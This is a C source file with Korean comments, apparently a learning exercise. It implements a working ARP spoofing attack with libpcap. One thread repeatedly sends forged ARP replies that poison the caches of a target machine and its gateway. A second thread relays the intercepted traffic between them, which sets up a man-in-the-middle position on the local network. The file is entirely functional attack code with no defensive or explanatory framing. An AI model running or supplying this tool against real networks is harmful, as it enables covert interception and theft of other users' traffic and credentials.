#include <netinet/if_ether.h>
#include "arpheader.h"

void *thread_infect(void *arg) //감염패킷킷
{

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap_handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1, errbuf);

    struct infect_addr_save *addr_save = (struct infect_addr_save *)arg;

    u_char pkt[PACKETSIZE];
    struct eth_arp_header *infect = (struct eth_arp_header *)pkt;

    // 공격 대상과 Gateway에게 번갈아가며 감염 패킷 전송
    int sw = 1;
    while (1)
    {

        //패킷 입력 시
        // dmac search-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -Destination 입력
        if (sw > 2)
            sw = 1;

        if (sw == 1)
            for (int i = 0; i <= 5; i++)
                infect->eth_dst_mac[i] = addr_save->save_target_mac[i]; //목적지 받은 패킷의 시작 주소
        else
            for (int i = 0; i <= 5; i++)
                infect->eth_dst_mac[i] = addr_save->save_gateway_mac[i];
        printf("\n");
        // smac --------------------------------------------

        for (int i = 0; i <= 5; i++)
            infect->eth_src_mac[i] = mymac[i]; // 보낼 패킷의 시작은 나의 mac 입력
        infect->type = ntohs(0x0806);          // ARP 0x0806
        infect->hd_type = ntohs(0x0001);       // HardWare type : ethernet 1
        infect->protocol_type = ntohs(0x0800); // Protocol type : IPv4 0x0800
        infect->hd_size = 0x06;                // Hardware size 6 , Protocol size 4
        infect->protocol_size = 0x04;          //
        infect->opcode = ntohs(0x0002);        // OPcode 1 = request ,2 = reply

        // 나의 mac 입력
        for (int i = 0; i <= 5; i++)
            infect->arp_sender_mac[i] = mymac[i];
        // 공격 대상의 IP (게이트웨이)
        if (sw == 1)
            infect->arp_sender_ip = addr_save->save_gateway_ip;
        else
            infect->arp_sender_ip = addr_save->save_target_ip;

        // 속일 mac 주소 (감염시킬 pc의 주소)
        if (sw == 1)
            for (int i = 0; i <= 5; i++)
                infect->arp_target_mac[i] = addr_save->save_target_mac[i]; //받은 패킷의 시작 주소
        else
            for (int i = 0; i <= 5; i++)
                infect->arp_target_mac[i] = addr_save->save_gateway_mac[i];

        // inet_aton(addr_save->save_target_ip,&s_packet->arp_target_ip);  // 감염시키려는 ip 주소
        if (sw == 1)
            infect->arp_target_ip = addr_save->save_target_ip;
        else
            infect->arp_target_ip = addr_save->save_gateway_ip;

        int res = pcap_sendpacket(pcap_handle, pkt, sizeof(pkt));
        sw += 1;
        if (res == -1)
            printf(" error\n");
        else
            printf("감염패킷 전송 성공! \n");

        sleep(3);
    }
}

void *thread_relay(void *arg)
{
    struct infect_addr_save *add_save = (struct infect_addr_save *)arg;
    char errbuf[PCAP_ERRBUF_SIZE];
    int res;
    pcap_t *pcap_handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1, errbuf);
    struct pcap_pkthdr *header;
    const u_char *packet;

    while (1)
    {
        pcap_next_ex(pcap_handle, &header, &packet);

        u_int pktsize = header->caplen;
        u_char cp_packet[pktsize];
        struct ether_header *eth_hdr = (struct ether_header *)packet;
        struct iphdr *ip_hdr = (struct iphdr *)(14 + packet);

        if (ip_hdr->daddr == inet_addr(myip))
            continue;

        if (check_mac(eth_hdr->ether_shost, add_save->save_target_mac) == 1 && ip_hdr->saddr == add_save->save_target_ip)
        {

            for (int i = 0; i < 6; i++)
            {
                eth_hdr->ether_dhost[i] = add_save->save_gateway_mac[i];
                eth_hdr->ether_shost[i] = mymac[i];
            }
            memcpy(cp_packet, packet, pktsize);
            res = pcap_sendpacket(pcap_handle, cp_packet, (int)pktsize);
            if (res == -1)
            {
                printf(" error\n");
                continue;
            }
            else
            {
                printf("Sender relay 전송 성공! \n");
                continue;
            }
        }

        if (check_mac(eth_hdr->ether_shost, add_save->save_gateway_mac) == 1 && ip_hdr->daddr == add_save->save_target_ip)
        {

            for (int i = 0; i < 6; i++)
            {
                eth_hdr->ether_dhost[i] = add_save->save_target_mac[i];
                eth_hdr->ether_shost[i] = mymac[i];
            }
            memcpy(cp_packet, packet, pktsize);
            res = pcap_sendpacket(pcap_handle, cp_packet, (int)pktsize);
            if (res == -1)
                printf(" error\n");
            else
                printf("relay 전송 성공! \n");
        }
    }
}

int main(int argc, char *argv[])
{
    if (argc <= 2 || argc % 2 == 1)
    {
        printf("error\n");
        return -1;
    }

    // my mac 구하는 함수  -------------------------------
    char *dev = argv[1];
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, "enp0s3");
    // strcpy(s.ifr_name, dev);
    ioctl(fd, SIOCGIFHWADDR, &s);

    for (int x = 0; x < 6; ++x)
    {
        mymac[x] = (u_int8_t)s.ifr_addr.sa_data[x];
    }

    //--------------------------------------------

    struct ifreq ifr;
    int ss;
    ss = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, "enp0s3", IFNAMSIZ);
    // strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    if (ioctl(ss, SIOCGIFADDR, &ifr) < 0)
    {
        printf("아이피 구하지 못힘 \n");
    }
    else
    {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, myip, sizeof(struct sockaddr));
    }

    pcap_t *pcap_handle;
    const u_char *packet;
    struct pcap_pkthdr *header;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap_handle == NULL)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    for (int i = 1; i <= argc / 2 - 1; i++)
    {
        broadcast(argv, pcap_handle); //최초 감염 시작. for문 다 돌기전에 reply 패킷 오는지 확인 해야함.
    }

    struct infect_addr_save *infect_addr_save;
    pthread_t thread[2];
    while (1)
    {
        //감염 패킷 쓰레드
        pcap_next_ex(pcap_handle, &header, &packet);
        struct eth_arp_header *receive_packet = (struct eth_arp_header *)packet;

        infect_addr_save = (struct infect_addr_save *)malloc(sizeof(struct infect_addr_save));
        if (ntohs(receive_packet->type) == ETHERTYPE_ARP && ntohs(receive_packet->opcode) == ARPOP_REPLY && receive_packet->arp_sender_ip == inet_addr(argv[2]))
        {
            infect_addr_save->save_target_ip = receive_packet->arp_sender_ip;
            infect_addr_save->save_gateway_ip = receive_packet->arp_target_ip;
            for (int i = 0; i < 6; i++)
            {
                infect_addr_save->save_target_mac[i] = receive_packet->eth_src_mac[i];
            }

            pthread_create(&thread[0], NULL, thread_infect, (void *)infect_addr_save);
            break;
        }
    }
    sleep(2);
    gateway_mac(argv, pcap_handle);

    sleep(1);
    while (1)
    {
        pcap_next_ex(pcap_handle, &header, &packet);
        struct eth_arp_header *receive_packet = (struct eth_arp_header *)packet;
        // 공격 대상에서 reply가 왔다면 패킷 relay 시작
        if (check_mac(receive_packet->eth_dst_mac, mymac) == 1 && receive_packet->arp_sender_ip == infect_addr_save->save_gateway_ip && ntohs(receive_packet->type) == ETHERTYPE_ARP && ntohs(receive_packet->opcode) == ARPOP_REPLY)
        {
            for (int i = 0; i < 6; i++)
            {
                infect_addr_save->save_gateway_mac[i] = receive_packet->eth_src_mac[i];
            }
            break;
        }
    }

    pthread_create(&thread[1], NULL, thread_relay, (void *)infect_addr_save);

    while (1)
    {
        sleep(1);
        printf("Search\n");
    }

    pcap_close(pcap_handle);
    free(infect_addr_save);
    return 0;
}
